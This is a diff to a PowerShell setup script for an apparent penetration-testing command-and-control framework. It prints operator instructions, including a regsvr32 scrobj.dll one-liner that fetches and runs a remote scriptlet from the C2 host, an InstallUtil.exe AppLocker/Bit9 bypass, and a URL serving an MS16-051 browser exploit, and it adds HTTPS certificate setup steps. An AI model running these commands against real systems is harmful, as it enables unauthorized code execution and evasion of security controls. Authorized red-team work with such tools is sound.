@@ -754,13 +754,13 @@ if ($args[0])
     Write-Host "To quickly get setup for internal pentesting, run:"
     write-host $shortcut `n -ForegroundColor green
     Write-Host "For a more stealthy approach internally, use SubTee's Regsvr32:"
-    write-host "regsvr32 /s /n /u /i:https://$($ipv4address):$($serverport)/$($downloaduri)_rg scrobj.dll" -ForegroundColor green
+    write-host "regsvr32 /s /n /u /i:$($ipv4address):$($serverport)/$($downloaduri)_rg scrobj.dll" -ForegroundColor green
     write-host ""
     Write-Host "To Bypass AppLocker or Bit9, use InstallUtil.exe found by SubTee:"
     write-host "C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U posh.exe" -ForegroundColor green
     write-host ""
     Write-Host "To exploit MS16-051 via IE9-11 use the following URL:"
-    write-host "https://$($ipv4address):$($serverport)/$($downloaduri)_ms16-051" -ForegroundColor green
+    write-host "$($ipv4address):$($serverport)/$($downloaduri)_ms16-051" -ForegroundColor green
     write-host ""
 
     #launch a new powershell session with the implant handler running
@@ -810,6 +810,22 @@ else
     $prompt = Read-Host -Prompt "[2] Do you want to use HTTPS? [No]"
     if ($prompt -eq "Yes") {
     $ipv4address = "https://"+$ipv4address
+    Write-Host "`nEither install a self-signed cert using IIS Resource Kit as below
+    https://www.microsoft.com/en-us/download/details.aspx?id=17275
+    selfssl.exe /N:CN=HTTPS_CERT /K:1024 /V:7 /S:1 /P:443
+
+    or 
+    
+    Download and convert the PEM to PFX for windows import and import to personal:
+openssl pkcs12 -inkey privkey.pem -in cert.pem -export -out priv.pfx
+
+Grab the thumbprint:
+dir cert:\localmachine\my|% { $_.thumbprint}
+
+Install using netsh:
+netsh http delete sslcert ipport=0.0.0.0:443
+netsh http add sslcert ipport=0.0.0.0:443 certhash=REPLACE `"appid={00112233-4455-6677-8899-AABBCCDDEEFF}`"
+"
         $defaultserverport = 443
     } else {
     $ipv4address = "http://"+$ipv4address
